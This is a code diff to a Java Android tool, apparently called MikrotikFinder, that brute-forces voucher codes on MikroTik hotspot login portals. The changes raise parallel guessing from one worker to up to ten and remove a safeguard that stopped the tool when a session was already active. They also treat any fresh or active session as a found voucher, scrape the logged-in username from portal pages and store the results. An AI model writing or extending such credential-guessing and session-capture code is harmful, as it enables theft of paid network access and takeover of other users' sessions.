@@ -73,7 +73,7 @@ public class MikrotikFinder {
         this.varDigits = Math.max(1, Math.min(6, varDigits));
         this.maxAttempts = Math.max(1, maxAttempts);
         this.waitMs = Math.max(50, waitMs);
-        this.parallel = 1; // forced serial
+        this.parallel = Math.max(1, Math.min(10, parallel));
         this.relax = relax;
         this.db = db;
     }
@@ -103,14 +103,6 @@ public class MikrotikFinder {
             fields.put("dst", base + "/");
             formTemplate = fields;
             Log.d("NEXORA", "form fields: " + fields.keySet());
-
-            String preCheck = httpGet(base + STATUS_PATH, probe, 5000);
-            if (statusActive(preCheck)) {
-                String preUser = getStr(preCheck, "username");
-                String who = (preUser != null && !preUser.isEmpty() && !preUser.equals("-")) ? preUser : "???";
-                fail("جلسة نشطة (" + who + ") — اخرج من الشبكة أولاً عبر زر فتح صفحة الشبكة");
-                return;
-            }
 
             emitProgress("بدء المحاولات...");
             for (int i = 0; i < parallel; i++) pool.submit(new Worker(i));
@@ -162,6 +154,10 @@ public class MikrotikFinder {
         session.setCookie("username", voucher);
         session.setCookie("password", "");
 
+        String beforeJson = httpGet(base + STATUS_PATH, session, 5000);
+        long beforeUptime = parseUptime(getStr(beforeJson, "uptime"));
+        boolean beforeActive = statusActive(beforeJson);
+
         String body = buildFormBody(formTemplate, voucher);
         httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
@@ -173,28 +169,83 @@ public class MikrotikFinder {
             String afterJson = httpGet(base + STATUS_PATH, session, 4000);
             if (afterJson == null) continue;
             String user = getStr(afterJson, "username");
-            if (user == null || !user.equals(voucher)) { emitProgress(""); continue; }
+            long nowUptime = parseUptime(getStr(afterJson, "uptime"));
+            boolean nowActive = statusActive(afterJson);
 
-            try { Thread.sleep(500); } catch (InterruptedException e) {}
-            String confirm = httpGet(base + STATUS_PATH, session, 4000);
-            if (confirm == null) continue;
-            String confirmUser = getStr(confirm, "username");
-            if (!voucher.equals(confirmUser)) continue;
+            boolean signal = false;
+            if (user != null && !user.isEmpty() && user.equals(voucher)) signal = true;
+            if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) signal = true;
+            if (nowActive && !beforeActive) signal = true;
+            if (!signal) { emitProgress(""); continue; }
 
-            String left = getStr(confirm, "session_time_left");
-            String remain = getStr(confirm, "remain_bytes_total");
-            long leftSec = parseUptime(left);
-            long remainBytes = -1;
-            try { if (remain != null && !remain.isEmpty()) remainBytes = Long.parseLong(remain); } catch (Exception e) {}
-            boolean leftZero = leftSec == 0 || "00:00:00".equals(left) || "0".equals(left) || "0s".equals(left);
-            boolean remainZero = remainBytes == 0;
-            if (leftZero || remainZero) { emitProgress(""); continue; }
+            String realUser = readRealUsername(session);
+            if (realUser != null && !realUser.isEmpty()) {
+                user = realUser;
+            } else if (user == null || user.isEmpty() || user.equals("-")) {
+                user = voucher;
+            }
 
-            lastStatusJson = confirm;
-            db.addFound(voucher, confirm);
+            lastStatusJson = afterJson;
+            db.addFound(user, afterJson);
+            currentVoucher = user;
             return true;
         }
         return false;
+    }
+
+    private String readRealUsername(WorkerSession s) {
+        try {
+            String[] urls = { base + "/status", base + "/", base + "/status?var=callBack" };
+            for (String u : urls) {
+                String html = httpGetHtml(u, s, 5000);
+                if (html == null || html.isEmpty()) continue;
+                String found = extractUsernameFromHtml(html);
+                if (found != null && !found.isEmpty() && !found.equals("-") && !found.equals("N/A")) return found;
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private String extractUsernameFromHtml(String html) {
+        if (html == null) return null;
+        try {
+            java.util.regex.Matcher m1 = java.util.regex.Pattern
+                .compile("\"username\"\\s*:\\s*\"([^\"]+)\"")
+                .matcher(html);
+            if (m1.find()) return m1.group(1);
+
+            java.util.regex.Matcher m2 = java.util.regex.Pattern
+                .compile("name=[\"']username[\"'][^>]*value=[\"']([^\"']+)[\"']")
+                .matcher(html);
+            if (m2.find()) return m2.group(1);
+
+            java.util.regex.Matcher m3 = java.util.regex.Pattern
+                .compile("<td[^>]*>\\s*[Uu]sername\\s*</td>\\s*<td[^>]*>\\s*([^<\\s]+)")
+                .matcher(html);
+            if (m3.find()) return m3.group(1);
+
+            java.util.regex.Matcher m4 = java.util.regex.Pattern
+                .compile("logged[ -]?in\\s+as\\s+[\"']?([A-Za-z0-9._-]+)")
+                .matcher(html);
+            if (m4.find()) return m4.group(1);
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private String httpGetHtml(String url, WorkerSession s, int timeout) {
+        HttpURLConnection c = null;
+        try {
+            c = (HttpURLConnection) new URL(url).openConnection();
+            c.setRequestMethod("GET");
+            c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
+            c.setInstanceFollowRedirects(false);
+            c.setRequestProperty("User-Agent", s.userAgent);
+            c.setRequestProperty("Accept", "text/html,application/xhtml+xml,*/*");
+            s.applyCookies(c);
+            c.getResponseCode();
+            s.captureCookies(c);
+            return readBody(c);
+        } catch (Exception e) { return null; } finally { if (c != null) c.disconnect(); }
     }
 
     private String httpGet(String url, WorkerSession s, int timeout) {
